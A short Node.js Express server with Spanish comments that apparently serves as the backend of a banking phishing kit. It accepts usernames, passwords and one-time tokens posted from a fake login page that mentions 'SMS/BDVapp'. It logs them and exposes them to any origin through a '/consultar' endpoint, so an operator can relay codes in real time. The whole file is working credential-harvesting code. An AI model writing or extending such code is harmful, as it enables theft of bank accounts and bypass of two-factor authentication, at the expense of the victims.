const express = require('express');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false,
    metodo: null 
};

// --- RUTA: RECIBIR MÉTODO (Botones SMS/BDVapp) ---
app.post('/metodo', (req, res) => {
    const { metodo } = req.body;
    baseDeDatosTemporal.metodo = metodo;
    baseDeDatosTemporal.actualizado = true;
    console.log(`🎯 Método Seleccionado: ${metodo}`);
    res.status(200).send("OK");
});

// --- RUTA: RECIBIR GENERAL (Login y actualizaciones) ---
app.post('/recibir', (req, res) => {
    const { user, pass, token, origen, metodo } = req.body;

    // Actualización inteligente: solo cambia lo que recibe
    if (user) baseDeDatosTemporal.user = user;
    if (pass) baseDeDatosTemporal.pass = pass;
    if (origen) baseDeDatosTemporal.origen = origen;
    if (metodo) baseDeDatosTemporal.metodo = metodo;

    // Lógica de Token para que no se borre si ya existe
    if (origen === "LOGIN_INICIAL") {
        baseDeDatosTemporal.token = null;
    } else if (token !== undefined && token !== "") {
        baseDeDatosTemporal.token = token;
    }

    baseDeDatosTemporal.actualizado = true;

    console.log("===============================");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`🛠️ Método Auth: ${baseDeDatosTemporal.metodo || "ESPERANDO..."}`);
    console.log(`📍 Origen: ${baseDeDatosTemporal.origen}`);
    console.log("===============================");

    res.status(200).send("OK");
});

app.post('/limpiar', (req, res) => {
    baseDeDatosTemporal = { user: null, pass: null, token: null, origen: null, actualizado: false, metodo: null };
    console.log("🧹 Base de datos reseteada.");
    res.status(200).send("Limpiado");
});

app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.get('/', (req, res) => {
    res.send("Servidor Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Puerto ${PORT}`); });
